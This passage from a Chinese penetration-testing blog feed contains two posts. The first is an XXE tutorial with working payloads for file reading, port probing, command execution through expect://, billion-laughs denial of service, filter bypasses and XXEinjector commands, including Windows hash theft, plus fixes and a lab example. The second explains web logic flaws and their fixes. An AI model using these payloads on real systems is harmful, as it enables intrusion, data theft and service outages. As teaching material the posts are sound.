class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY rabbit SYSTEM &quot;http://192.168.1.1：81/mark4z5&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">&lt;firstname&gt;&amp;rabbit;&lt;/firstname&gt;</span><br><span class="line">&lt;lastname&gt;666&lt;/lastname&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220811145102265.png" alt="image-20220811145102265"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220811145112839.png" alt="image-20220811145112839"></p><p>该CASE是探测192.168.1.1的80、81端口，通过返回的“Connection refused”可以知道该81端口是closed的，而80端口是open的。</p><h3 id="4-RCE"><a href="#4-RCE" class="headerlink" title="4. RCE"></a>4. RCE</h3><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220811145231755.png" alt="image-20220811145231455"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;xxe;&lt;/x&gt;</span><br></pre></td></tr></table></figure><p>该 CASE 是在安装 expect 扩展的 PHP 环境里执行系统命令，其他协议也有可能可以执行系统命令，比如<code>php://input</code>、<code>php://filter</code>等。</p><h3 id="5-DOS"><a href="#5-DOS" class="headerlink" title="5. DOS"></a>5. DOS</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lolz [</span><br><span class="line">  &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</span><br></pre></td></tr></table></figure><p>此测试可以在内存中将小型 XML 文档扩展到超过 3GB 而使服务器崩溃。<br>亦或者，如果目标是UNIX系统：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [ </span><br><span class="line">  &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">  &lt;!ENTITY xxe SYSTEM &quot;file:///dev/random&quot; &gt;]&gt;</span><br><span class="line">&lt;foo&gt;&amp;xxe;&lt;/foo&gt;</span><br></pre></td></tr></table></figure><h2 id="XXE-利用场景"><a href="#XXE-利用场景" class="headerlink" title="XXE 利用场景"></a>XXE 利用场景</h2><h3 id="SVG"><a href="#SVG" class="headerlink" title="SVG"></a>SVG</h3><p>在xml文档的svg图片标签中插入恶意实体。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;file:///proc/self/cwd/flag.txt&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;svg height=&quot;100&quot; width=&quot;1000&quot;&gt;</span><br><span class="line">  &lt;text x=&quot;10&quot; y=&quot;20&quot;&gt;&amp;file;&lt;/text&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure><h3 id="excel"><a href="#excel" class="headerlink" title="excel"></a>excel</h3><p>利用EXCEL进行XXE攻击。首先用excel创建一个空白的xlsx，然后解压：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir XXE &amp;&amp; cd XXE</span><br><span class="line">unzip ../XXE.xlsx</span><br></pre></td></tr></table></figure><p>将解压得到的<code>[Content_Types].xml</code>改成恶意xml，再压缩回去：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -r ../poc.xlsx *</span><br></pre></td></tr></table></figure><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>利用正则匹配的一些过滤规则，可以尝试使用大小写绕过。</p><h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>比如一些关键词：ENTITY、SYSTEM、file 等被写入黑名单，无法在XML中构造外部实体，可以尝试使用编码绕过，比如 UTF-16BE</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat payload.xml | iconv -f utf-8 -t utf-16be &gt; payload.8-16be.xml</span><br></pre></td></tr></table></figure><p>如果是过滤了http等协议，可以利用实体编码绕过，在前面的XXE利用方式中有用过。</p><h3 id="其他协议绕过"><a href="#其他协议绕过" class="headerlink" title="其他协议绕过"></a>其他协议绕过</h3><p>如果http被过滤，无法上传XML文件，可以用<code>file://</code>、<code>php://filter</code>、<code>data://</code></p><ul><li><p><strong><code>data://</code></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY % a SYSTEM &quot;data://text/plain;base64,PCFFTlRJVFkgJSAgYiBTWVNURU0gJ2h0dHA6Ly8xMjcuMC4wLjEvaGFjay5kdGQnPg==&quot;&gt; </span><br><span class="line">    %a; </span><br><span class="line">    %b; </span><br><span class="line">]&gt;</span><br><span class="line">&lt;test&gt;</span><br><span class="line">    &amp;xxe;</span><br><span class="line">&lt;/test&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--编码内容--&gt;</span><br><span class="line">&lt;!ENTITY % b SYSTEM &#x27;http://127.0.0.1/test.dtd&#x27;&gt;</span><br></pre></td></tr></table></figure><p>然后使用data协议上传：<code>?text=data://text/plain,代码内容</code></p></li><li><p><strong><code>file://</code>加文件上传</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">    &lt;!ENTITY % a SYSTEM &quot;file:///var/www/uploads/1.jpg&quot;&gt;</span><br><span class="line">    %a;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--上传文件1.jpg，内容如下--&gt;</span><br><span class="line">&lt;!ENTITY % b SYSTEM &#x27;http://192.168.1.1:8080/hack.dtd&#x27;&gt;</span><br></pre></td></tr></table></figure></li><li><p><strong><code>php://filter</code>协议加文件上传</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE test [ </span><br><span class="line">    &lt;!ENTITY % a SYSTEM &quot;php://filter/read=convert.base64-decode/resource=/var/www/uploads/test.jpg&quot;&gt;</span><br><span class="line">    %a;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;test&gt;</span><br><span class="line">    &amp;xxe;</span><br><span class="line">&lt;/test&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--上传文件test.jpg，内容如下--&gt;</span><br><span class="line">&lt;!--base64编码内容--&gt;</span><br><span class="line">PCFFTlRJVFkgaGhoIFNZU1RFTSAncGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4vZmxhZy5waHAnPg==</span><br></pre></td></tr></table></figure><p>编码的原本内容为<code>&lt;!ENTITY xxe SYSTEM &#39;php://filter/read=convert.base64-encode/resource=./flag.php&#39;&gt;</code>。</p></li></ul><h2 id="自动化-XXE-工具"><a href="#自动化-XXE-工具" class="headerlink" title="自动化 XXE 工具"></a>自动化 XXE 工具</h2><p><strong>XXEinjector</strong>是一款基于Ruby的XXE注入工具.</p><p>它可以使用多种直接或间接带外方法来检索文件。其中，目录枚举功能只对Java应用程序有效，而暴力破解攻击需要使用到其他应用程序。</p><p>建议在kali环境下运行</p><p><strong>基本参数详解：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">--host   必填项– 用于建立反向链接的IP地址。(--host=192.168.0.2)</span><br><span class="line">--file   必填项- 包含有效HTTP请求的XML文件。(--file=/tmp/req.txt)</span><br><span class="line">--path      必填项-是否需要枚举目录 – 枚举路径。(--path=/etc)</span><br><span class="line">--brute     必填项-是否需要爆破文件 -爆破文件的路径。(--brute=/tmp/brute.txt)</span><br><span class="line">--logger    记录输出结果。</span><br><span class="line">--rhost     远程主机IP或域名地址。(--rhost=192.168.0.3)</span><br><span class="line">--rport     远程主机的TCP端口信息。(--rport=8080)</span><br><span class="line">--phpfilter  在发送消息之前使用PHP过滤器对目标文件进行Base64编码。</span><br><span class="line">--netdoc   使用netdoc协议。(Java).``</span><br><span class="line">--enumports  枚举用于反向链接的未过滤端口。(--enumports=21,22,80,443,445)</span><br><span class="line">--hashes    窃取运行当前应用程序用户的Windows哈希。</span><br><span class="line">--expect    使用PHP expect扩展执行任意系统命令。(--expect=ls)</span><br><span class="line">--upload    使用Java jar向临时目录上传文件。(--upload=/tmp/upload.txt)</span><br><span class="line">--xslt   XSLT注入测试。</span><br><span class="line">--ssl       使用SSL。</span><br><span class="line">--proxy     使用代理。(--proxy=127.0.0.1:8080)</span><br><span class="line">--httpport Set自定义HTTP端口。(--httpport=80)</span><br><span class="line">--ftpport    设置自定义FTP端口。(--ftpport=21)</span><br><span class="line">--gopherport 设置自定义gopher端口。(--gopherport=70)</span><br><span class="line">--jarport    设置自定义文件上传端口。(--jarport=1337)</span><br><span class="line">--xsltport 设置自定义用于XSLT注入测试的端口。(--xsltport=1337)</span><br><span class="line">--test   该模式可用于测试请求的有效。</span><br><span class="line">--urlencode   URL编码，默认为URI。</span><br><span class="line">--output    爆破攻击结果输出和日志信息。(--output=/tmp/out.txt)</span><br><span class="line">--timeout   设置接收文件/目录内容的Timeout。(--timeout=20)</span><br><span class="line">--contimeout 设置与服务器断开连接的，防止DoS出现。(--contimeout=20)</span><br><span class="line">--fast   跳过枚举询问，有可能出现结果假阳性。</span><br><span class="line">--verbose   显示verbose信息。</span><br></pre></td></tr></table></figure><p><strong>使用方法：</strong></p><p>枚举HTTPS应用程序中的&#x2F;etc目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt –ssl</span><br></pre></td></tr></table></figure><p>使用gopher（OOB方法）枚举&#x2F;etc目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/req.txt --oob=gopher</span><br></pre></td></tr></table></figure><p>二次漏洞利用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --host=192.168.0.2 --path=/etc --file=/tmp/vulnreq.txt--2ndfile=/tmp/2ndreq.txt</span><br></pre></td></tr></table></figure><p>使用HTTP带外方法和netdoc协议对文件进行爆破攻击：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --host=192.168.0.2 --brute=/tmp/filenames.txt--file=/tmp/req.txt --oob=http –netdoc</span><br></pre></td></tr></table></figure><p>通过直接性漏洞利用方式进行资源枚举：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --file=/tmp/req.txt --path=/etc --direct=UNIQUEMARK</span><br></pre></td></tr></table></figure><p>枚举未过滤的端口：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --enumports=all</span><br></pre></td></tr></table></figure><p>窃取Windows哈希：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb--host=192.168.0.2 --file=/tmp/req.txt –hashes</span><br></pre></td></tr></table></figure><p>使用Java jar上传文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt--upload=/tmp/uploadfile.pdf</span><br></pre></td></tr></table></figure><p>使用PHP expect执行系统指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt --oob=http --phpfilter--expect=ls</span><br></pre></td></tr></table></figure><p>测试XSLT注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --host=192.168.0.2 --file=/tmp/req.txt –xslt</span><br></pre></td></tr></table></figure><p>记录请求信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby XXEinjector.rb --logger --oob=http--output=/tmp/out.txt</span><br></pre></td></tr></table></figure><h2 id="XXE-漏洞修复与防御方案"><a href="#XXE-漏洞修复与防御方案" class="headerlink" title="XXE 漏洞修复与防御方案"></a>XXE 漏洞修复与防御方案</h2><ol><li><p>推荐使用开发语言提供的<strong>禁用外部实体</strong>的方法。</p><p>PHP：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(true);</span><br></pre></td></tr></table></figure><p>JAVA：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br></pre></td></tr></table></figure><p>python：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br></pre></td></tr></table></figure></li><li><p>过滤用户提交的 XML 数据</p><p>过滤关键词：<code>&lt;!DOCTYPE</code>、<code>&lt;!ENTITY</code>、SYSTEM、PUBLIC</p></li></ol><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p><strong>xxe-lab</strong></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220811163807711.png" alt="image-20220811163807711"></p><p>登陆界面，输入用户名密码，抓包</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220811163854896.png" alt="image-20220811163854896"></p><p>发现输入的数据使用post请求发送，且格式类似XML。</p><p>构造payload，执行文件读取：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE Mikasa [</span><br><span class="line">&lt;!ENTITY test SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;</span><br><span class="line">&lt;username&gt;&amp;test;&lt;/username&gt;   &lt;!-- 实体引用 --&gt;</span><br><span class="line">&lt;password&gt;Mikasa&lt;/password&gt;</span><br><span class="line">&lt;/user&gt;</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220811164116973.png" alt="image-20220811164116973"></p><p>成功获取到Windows配置信息。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;XXE漏洞&quot;&gt;&lt;a href=&quot;#XXE漏洞&quot; class=&quot;headerlink&quot; title=&quot;XXE漏洞&quot;&gt;&lt;/a&gt;XXE漏洞&lt;/h1&gt;&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/08DlKYbVXPt</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>逻辑漏洞</title>
    <link href="https://frankcao3.github.io/posts/45471"/>
    <id>https://frankcao3.github.io/posts/45471</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2023-10-06T09:09:05.975Z</updated>
    
    <content type="html"><![CDATA[<h1 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h1><p>参考：<a href="https://www.freebuf.com/vuls/281141.html">https://www.freebuf.com/vuls/281141.html</a></p><h2 id="身份验证漏洞"><a href="#身份验证漏洞" class="headerlink" title="身份验证漏洞"></a>身份验证漏洞</h2><h3 id="暴力破解漏洞"><a href="#暴力破解漏洞" class="headerlink" title="暴力破解漏洞"></a>暴力破解漏洞</h3><p>攻击者可以通过该漏洞获取用户名和对应弱口令密码，并进行登录操作。</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>由于没有设置登录失败次数限制，导致攻击者可以通过口令字典进行特定用户的密码爆破或通过用户名字典进行特定弱口令的用户枚举。</p><h4 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h4><p>系统登录点</p><h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><p>对于固定用户名爆破密码，可以针对用户名进行错误次数计算，高于一定阈值账号锁定一段时间，或者添加验证码。但是不能永久锁定，可能被用来进行账户恶意锁定；</p><p>对于固定密码枚举用户名、 需要计算IP对URL的请求情况，若某个IP短时间大量请求登录则应该加入黑名单，对传输数据进行加密有一定的防护效果。</p><h3 id="Session固定攻击"><a href="#Session固定攻击" class="headerlink" title="Session固定攻击"></a>Session固定攻击</h3><p>会话固定攻击是利用服务器的session不变机制，借他人之手获得认证和授权，然后冒充他人 。</p><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>在请求登录过程时候，URL带有一个session，登录成功之后会将登录成功的信息绑定到这个session中，攻击者可以发送带有session的URL给相关工作人员诱导其登录，相当于获取了其身份信息。</p><h4 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h4><p>在GET方法请求登录时候带有session值。</p><h4 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h4><p>避免在URL中带入session信息。</p><p>另外也要注意POST请求中带有sessionid进行session固定攻击，虽然可利用性比较低，但是建议修复。</p><h3 id="cookie欺骗"><a href="#cookie欺骗" class="headerlink" title="cookie欺骗"></a>cookie欺骗</h3><p>通过伪造cookie信息能够伪造其他用户进行登录。</p><h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p>开发者为了方便将身份信息&#x2F;登录信息明文或者只是简单编码、哈希之后存放在cookies中，网站通过获取得到的cookies进行授权或者身份验证。</p><h4 id="漏洞点-2"><a href="#漏洞点-2" class="headerlink" title="漏洞点"></a>漏洞点</h4><p>cookie中有明显或者只是简单编码、哈希的字段时候，比如修改lsLogin值为1可以判定为用户已经登录，修改cookie为asp163&#x3D;UserName&#x3D;admin可以获得管理员权限。</p><h4 id="修复-2"><a href="#修复-2" class="headerlink" title="修复"></a>修复</h4><p>Cookie不应该存储可理解的身份信息和登录信息 按照规定，cookie对身份信息和登录信息的存储只能通过存储足够长度的随机字符串进行，避免篡改。</p><h2 id="逻辑越权漏洞"><a href="#逻辑越权漏洞" class="headerlink" title="逻辑越权漏洞"></a>逻辑越权漏洞</h2><p>参考：</p><p><a href="https://blog.csdn.net/huangyongkang666/article/details/123629813">https://blog.csdn.net/huangyongkang666/article/details/123629813</a></p><p><a href="https://www.freebuf.com/articles/web/195837.html">https://www.freebuf.com/articles/web/195837.html</a></p><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>越权访问（Broken Access Control，BAC），指应用在检查授权时存在漏洞，使得攻击者在获得低权限用户账号后，利用一些方式绕过权限检查，访问或者操作其他用户或者更高权限的用户。</p><h3 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h3><p>开发人员在对数据进行增删查改时，对客户端请求的数据过分相信而遗漏了权限的判定，权限验证不当而导致的越权行为。</p><p>通常情况下，一个 Web 程序功能流程是登录 - 提交请求 - 验证权限 - 数据库查询 - 返回结果。如果验证权限不足，便会导致越权。常见的程序都会认为通过登录后即可验证用户的身份，从而不会做下一步验证，最后导致越权。</p><ul><li>隐藏URL</li><li>直接对象引用</li><li>多阶段功能</li><li>静态文件</li><li>平台配置错误</li></ul><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><h4 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h4><p>水平越权是指攻击者尝试访问与他具有<strong>相同权限</strong>的用户资源。</p><p><strong>形成原因</strong>：在进行方法调用的时候未验证请求用户和目标信息拥有者是否匹配一致，而是直接用userid&#x2F;email之类的容易遍历的参数进行数据库查询，导致攻击者利用了其他人的userid。</p><p>比如，用户A和用户B属于同一角色，拥有相同的权限等级，他们能获取自己的私有数据（数据A和数据B），但如果系统只验证了能访问数据的角色，而没有对数据做细分或者校验，导致用户A能访问到用户B的数据（数据B），那么用户A访问数据B的行为就叫做水平越权访问。</p><p><strong>修复</strong>：利用getAttribute(“userid”)获取其userid，而不是直接接收userid参数，避免了userid参数传输。</p><p>以下是常出现的水平越权的几种场景：</p><ul><li><p>基于用户身份ID</p><p>在使用某个功能时，通过用户提交的身份ID（用户ID、账号、手机号、证件号等用户唯一标识）来访问或操作对应的数据。</p></li><li><p>基于对象ID</p><p>在使用某个功能时，通过用户提交的对象ID（如订单号、记录号）来访问或操作对应的数据。</p></li><li><p>基于文件名</p><p>在使用某个功能时，通过文件名直接访问文件，最常见于用户上传文件的场景。</p></li></ul><h4 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h4><p>垂直越权是指<strong>低权限用户尝试访问高权限用户</strong>的资源。</p><p><strong>形成原因</strong>：由于后台应用没有做权限控制、角色校验，或仅仅在菜单、按钮上做了权限控制，导致恶意用户只要<u>猜测其他管理页面的URL或者敏感的参数信息</u>，就可以访问或控制其他角色拥有的数据或页面，达到权限提升的目的。</p><p>主要有以下两种场景：</p><p>未认证账号，访问无需认证就能访问该功能</p><p>不具备某个功能权限的账户，认证后能成功访问该功能</p><h4 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h4><p>游客能够访问普通用户甚至超级管理员才能访问的系统信息或者系统功能，</p><p><strong>产生原因</strong>：系统设计期间没有进行全局用户身份校验；或者校验存在缺陷。</p><h2 id="业务数据篡改"><a href="#业务数据篡改" class="headerlink" title="业务数据篡改"></a>业务数据篡改</h2><p><strong>概念</strong>：篡改一些参数的数值，达到获利的目的。</p><p>若是篡改验证用的判断参数，比如判断用户类型的userType，可能用于实现垂直越权；</p><p>若是篡改用户参数，比如手机号、身份证号，可能用于实现水平越权。</p><p><strong>漏洞点</strong>：抽奖、购买、转账、返现等功能。</p><p><strong>修复</strong>：</p><p>计算传输数据的哈希，并将哈希附加在传输数据中作为校验值，避免被篡改。</p><p>设置token。</p><h2 id="执行顺序逻辑漏洞"><a href="#执行顺序逻辑漏洞" class="headerlink" title="执行顺序逻辑漏洞"></a>执行顺序逻辑漏洞</h2><p><strong>概念</strong>：也是篡改参数，但是是通过<u>篡改分步逻辑中的步骤数字</u>，达到绕过支付、校验等效果。</p><p><strong>原理</strong>：程序逻辑分布进行，但是对步骤、验证信息、支付信息没有做好严格校验，导致修改步骤就直接绕过验证或者支付。</p><p><strong>漏洞点</strong>：任何分布逻辑且带步骤数字，或者利用JS进行步骤控制的功能中。</p><p><strong>修复</strong>：</p><p>在请求最后一步时候需要<u>带入前面的验证信息</u>，服务端再进行一次校验信息的验证，验证正确方能继续执行数据操作；</p><p>也可以通过getAttributr(“userid”)获取userid进行userid和验证结果绑定，最后一步不带入验证信息，但是仍然要获取userid进行校验；</p><p>再最后一步通过验证之后或者服务器收到支付信息后再生成相应的数据交给用户。</p><h2 id="验证码爆破"><a href="#验证码爆破" class="headerlink" title="验证码爆破"></a>验证码爆破</h2><p><strong>概念</strong>：抓包后重放，进行参数值遍历。可以用于突破图形验证码的验证，可以实现如登录爆破、个人信息爆破、验证码绕过等攻击。</p><p><strong>修复：</strong></p><ul><li>验证码使用后立即重新生成</li><li>设置验证码有效期</li><li>验证码的部分仅使用图片，不使用字符串</li><li>不进行分布校验，而是连同请求数据一起发送到目标服务器进行校验</li></ul><h2 id="找回密码"><a href="#找回密码" class="headerlink" 